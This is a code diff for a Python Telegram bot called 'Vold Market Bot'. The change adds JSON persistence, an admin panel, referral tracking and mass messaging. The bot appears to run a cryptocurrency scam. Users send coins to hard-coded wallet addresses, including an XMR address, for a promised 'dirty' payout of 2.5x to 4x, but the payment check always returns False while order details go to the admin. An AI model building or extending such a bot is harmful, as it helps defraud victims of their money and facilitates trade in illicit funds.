@@ -1,8 +1,10 @@
 #!/usr/bin/env python3
-"""Vold Market Bot – English only, referral tracking, admin help."""
+"""Vold Market Bot – English only, persistent data, interactive admin panel."""
 
 import asyncio
+import json
 import logging
+import os
 import random
 from typing import Dict, Set
 
@@ -36,12 +38,42 @@ CRYPTO_ADDRESSES = {
     "XMR": "48hjiNMpfpQ8BfLe1Hy6P7MxZM4WXvXLggAdc3Er4Pzs6W5dDYStBzzKB9VWcBCNZHDuoexKTT9HJYoCR1GZX6Qs4M7a3YW",
 }
 
-MULTIPLIER_TIERS = [
-    (50, 199.99, 2.5),
-    (200, 499.99, 3.0),
-    (500, 999.99, 3.5),
-    (1000, float("inf"), 4.0),
-]
+# Persistent data file
+DATA_FILE = "vold_data.json"
+
+# ==================== PERSISTENCE ====================
+def load_data():
+    if os.path.exists(DATA_FILE):
+        with open(DATA_FILE, "r") as f:
+            data = json.load(f)
+        all_users_set = set(data.get("users", []))
+        referral_tree_dict = {int(k): int(v) for k, v in data.get("ref_tree", {}).items()}
+        referral_count_dict = {int(k): v for k, v in data.get("ref_count", {}).items()}
+        tiers = data.get("multipliers", None)
+        return all_users_set, referral_tree_dict, referral_count_dict, tiers
+    return set(), {}, {}, None
+
+def save_data():
+    data = {
+        "users": list(all_users),
+        "ref_tree": {str(k): v for k, v in referral_tree.items()},
+        "ref_count": {str(k): v for k, v in referral_count.items()},
+        "multipliers": list(MULTIPLIER_TIERS),
+    }
+    with open(DATA_FILE, "w") as f:
+        json.dump(data, f, indent=2)
+
+# Load initial data
+all_users, referral_tree, referral_count, saved_tiers = load_data()
+if saved_tiers is not None:
+    MULTIPLIER_TIERS = [(low, high, mult) for low, high, mult in saved_tiers]
+else:
+    MULTIPLIER_TIERS = [
+        (50, 199.99, 2.5),
+        (200, 499.99, 3.0),
+        (500, 999.99, 3.5),
+        (1000, float("inf"), 4.0),
+    ]
 
 PRICE = {
     "BTC": 64180.26,
@@ -167,24 +199,19 @@ A: Guide provided with purchase.""",
         "Referral participants: {}\n"
         "Total referral links used: {}"
     ),
+    "rates_header": "📊 *Current Multiplier Tiers*\n\n",
+    "admin_panel": "🛠️ *Admin Panel*\nChoose an action:",
     "rates_updated": "✅ Multiplier tiers updated.",
     "rates_reset": "✅ Multiplier tiers reset to default.",
-    "invalid_tier": "❌ Invalid tier format. Use: /setrates <low> <high> <mult>",
+    "invalid_tier_input": "❌ Invalid tier format. Please enter: low high multiplier",
     "help_text": (
         "🛠️ *Admin Commands*\n\n"
+        "/admin – Open interactive admin panel\n"
         "/stats – Show bot statistics\n"
         "/dmall [message] – Send a broadcast message to all users (optional custom message)\n"
-        "/setrates <low> <high> <mult> – Add or update a multiplier tier\n"
-        "/resetrates – Reset multiplier tiers to default\n"
+        "/help – Show this help\n"
     ),
 }
-
-# ==================== GLOBALS ====================
-all_users: Set[int] = set()
-pending_checks: Dict[int, asyncio.Task] = {}
-
-referral_tree: Dict[int, int] = {}      # user_id -> referrer_id
-referral_count: Dict[int, int] = {}     # referrer_id -> number of direct referrals
 
 # ==================== HELPERS ====================
 def t(key: str, *args) -> str:
@@ -208,6 +235,22 @@ def main_menu() -> InlineKeyboardMarkup:
         [InlineKeyboardButton(T["vouches"], url=f"https://t.me/{VOUCHES_USERNAME[1:]}")],
     ])
 
+def admin_menu() -> InlineKeyboardMarkup:
+    return InlineKeyboardMarkup([
+        [InlineKeyboardButton("📊 View Rates", callback_data="admin_view_rates")],
+        [InlineKeyboardButton("➕ Add Tier", callback_data="admin_add_tier")],
+        [InlineKeyboardButton("❌ Delete Last Tier", callback_data="admin_del_tier")],
+        [InlineKeyboardButton("🔄 Reset Default", callback_data="admin_reset_rates")],
+        [InlineKeyboardButton("📢 DMALL", callback_data="admin_dmall")],
+        [InlineKeyboardButton("📈 Stats", callback_data="admin_stats")],
+        [InlineKeyboardButton("🔙 Close Panel", callback_data="admin_close")],
+    ])
+
+# Save data after changes
+def save_and_log():
+    save_data()
+    logging.info("Data saved.")
+
 # ==================== STOCK UPDATER ====================
 async def stock_updater():
     while True:
@@ -219,7 +262,9 @@ async def stock_updater():
 # ==================== HANDLERS ====================
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = update.effective_user.id
-    all_users.add(user_id)
+    if user_id not in all_users:
+        all_users.add(user_id)
+        save_and_log()
 
     if update.message and update.message.text:
         args = update.message.text.split()
@@ -231,13 +276,20 @@ async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             if referrer_id and referrer_id != user_id and referrer_id in all_users:
                 referral_tree[user_id] = referrer_id
                 referral_count[referrer_id] = referral_count.get(referrer_id, 0) + 1
+                save_and_log()
                 try:
                     await context.bot.send_message(referrer_id, T["referrer_join_notify"])
                 except:
                     pass
                 await update.message.reply_text(T["referral_join_info"])
 
-    await update.message.reply_text(T["start"], reply_markup=main_menu(), parse_mode=ParseMode.MARKDOWN)
+    # If called from callback, edit the message; else send new
+    if update.callback_query:
+        query = update.callback_query
+        await query.answer()
+        await query.edit_message_text(T["start"], reply_markup=main_menu(), parse_mode=ParseMode.MARKDOWN)
+    else:
+        await update.message.reply_text(T["start"], reply_markup=main_menu(), parse_mode=ParseMode.MARKDOWN)
 
 async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
@@ -246,7 +298,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
     user_id = query.from_user.id
 
     if data == "rates":
-        text = "📊 *Rates (x multiplier)*\n\n"
+        text = T["rates_header"]
         for low, high, mult in MULTIPLIER_TIERS:
             text += f"${low}-${high if high < float('inf') else '+'}: x{mult}\n"
         text += f"\n💰 *Available stock*: ETH ${STOCK['ETH']:,.0f}, BTC ${STOCK['BTC']:,.0f}"
@@ -262,7 +314,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> N
         text = t("referral_info", BOT_USERNAME, user_id, count)
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(T["back"], callback_data="back")]]), parse_mode=ParseMode.MARKDOWN)
     elif data == "back":
-        await cmd_start(update, context)
+        await cmd_start(update, context)  # go to main menu
 
 # ==================== BUY CONVERSATION ====================
 AMOUNT, COIN_RECEIVE, ADDRESS_RECEIVE, PAYMENT_METHOD, PAYMENT = range(5)
@@ -379,7 +431,6 @@ async def check_payment(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     dirty_amount = context.user_data["dirty_amount"]
     receive_address = context.user_data["receive_address"]
 
-    # Détection du parrain pour information admin seulement
     referrer_id = referral_tree.get(user_id)
     if referrer_id:
         try:
@@ -399,7 +450,6 @@ async def check_payment(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
                        pay_amount, expected, pay_coin,
                        dirty_amount, receive_coin,
                        receive_address)
-
     await context.bot.send_message(ADMIN_ID, admin_text, parse_mode=ParseMode.MARKDOWN)
 
     paid = await verify_payment(pay_coin, CRYPTO_ADDRESSES[pay_coin], expected)
@@ -454,7 +504,65 @@ async def cancel_buy(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
 async def verify_payment(crypto: str, address: str, expected: float) -> bool:
     return False
 
-# ==================== ADMIN COMMANDS ====================
+# ==================== ADMIN PANEL ====================
+async def cmd_admin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    if update.effective_user.id != ADMIN_ID:
+        return
+    await update.message.reply_text(T["admin_panel"], reply_markup=admin_menu(), parse_mode=ParseMode.MARKDOWN)
+
+async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    query = update.callback_query
+    await query.answer()
+    data = query.data
+    if update.effective_user.id != ADMIN_ID:
+        await query.edit_message_text("Access denied.")
+        return
+
+    if data == "admin_view_rates":
+        text = T["rates_header"]
+        for low, high, mult in MULTIPLIER_TIERS:
+            text += f"${low}-${high if high < float('inf') else '+'}: x{mult}\n"
+        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
+                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Admin", callback_data="admin_back")]]))
+    elif data == "admin_add_tier":
+        # Guide the admin to use /setrates command for now (or implement inline state)
+        await query.edit_message_text("Use /setrates <low> <high> <mult> to add or update a tier.",
+                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
+    elif data == "admin_del_tier":
+        if MULTIPLIER_TIERS:
+            removed = MULTIPLIER_TIERS.pop()
+            save_and_log()
+            await query.edit_message_text(f"Last tier removed: {removed}",
+                                          reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
+        else:
+            await query.edit_message_text("No tiers to delete.",
+                                          reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
+    elif data == "admin_reset_rates":
+        MULTIPLIER_TIERS.clear()
+        MULTIPLIER_TIERS.extend([
+            (50, 199.99, 2.5),
+            (200, 499.99, 3.0),
+            (500, 999.99, 3.5),
+            (1000, float("inf"), 4.0),
+        ])
+        save_and_log()
+        await query.edit_message_text(T["rates_reset"],
+                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
+    elif data == "admin_dmall":
+        await query.edit_message_text("Use /dmall <message> to broadcast.",
+                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
+    elif data == "admin_stats":
+        total_refs = len(referral_tree)
+        total_links = sum(referral_count.values())
+        text = t("stats_text", len(all_users), total_refs, total_links)
+        await query.edit_message_text(text, parse_mode=ParseMode.MARKDOWN,
+                                      reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_back")]]))
+    elif data == "admin_close":
+        await query.edit_message_text("Admin panel closed.")
+    elif data == "admin_back":
+        await query.edit_message_text(T["admin_panel"], reply_markup=admin_menu(), parse_mode=ParseMode.MARKDOWN)
+
+# ==================== COMMANDS ====================
 async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     if update.effective_user.id != ADMIN_ID:
         return
@@ -490,14 +598,14 @@ async def cmd_setrates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     if update.effective_user.id != ADMIN_ID:
         return
     if not context.args or len(context.args) != 3:
-        await update.message.reply_text(T["invalid_tier"])
+        await update.message.reply_text(T["invalid_tier_input"])
         return
     try:
         low = float(context.args[0])
         high = float(context.args[1])
         mult = float(context.args[2])
     except ValueError:
-        await update.message.reply_text(T["invalid_tier"])
+        await update.message.reply_text(T["invalid_tier_input"])
         return
     replaced = False
     for i, (l, h, m) in enumerate(MULTIPLIER_TIERS):
@@ -508,28 +616,19 @@ async def cmd_setrates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> No
     if not replaced:
         MULTIPLIER_TIERS.append((low, high, mult))
         MULTIPLIER_TIERS.sort(key=lambda x: x[0])
+    save_and_log()
     await update.message.reply_text(T["rates_updated"])
-
-async def cmd_resetrates(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if update.effective_user.id != ADMIN_ID:
-        return
-    global MULTIPLIER_TIERS
-    MULTIPLIER_TIERS = [
-        (50, 199.99, 2.5),
-        (200, 499.99, 3.0),
-        (500, 999.99, 3.5),
-        (1000, float("inf"), 4.0),
-    ]
-    await update.message.reply_text(T["rates_reset"])
 
 # ==================== MAIN ====================
 async def on_startup(app: Application):
     asyncio.create_task(stock_updater())
+    logging.info("Bot started and data loaded.")
 
 def main() -> None:
     logging.basicConfig(level=logging.INFO)
     app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
 
+    # Conversation handler for buying
     conv_handler = ConversationHandler(
         entry_points=[CallbackQueryHandler(buy_start, pattern="^buy$")],
         states={
@@ -546,15 +645,19 @@ def main() -> None:
     )
     app.add_handler(conv_handler)
 
+    # Menu and back (standalone)
     app.add_handler(CallbackQueryHandler(menu_callback, pattern="^(referral|rates|faq|tos|support|back)$"))
-    app.add_handler(CommandHandler("start", cmd_start))
 
-    # Admin commands
+    # Admin panel callbacks
+    app.add_handler(CallbackQueryHandler(admin_callback, pattern="^admin_"))
+
+    # Commands
+    app.add_handler(CommandHandler("start", cmd_start))
+    app.add_handler(CommandHandler("admin", cmd_admin))
     app.add_handler(CommandHandler("help", cmd_help))
     app.add_handler(CommandHandler("stats", cmd_stats))
     app.add_handler(CommandHandler("dmall", cmd_dmall))
     app.add_handler(CommandHandler("setrates", cmd_setrates))
-    app.add_handler(CommandHandler("resetrates", cmd_resetrates))
 
     print("Bot running...")
     app.run_polling()
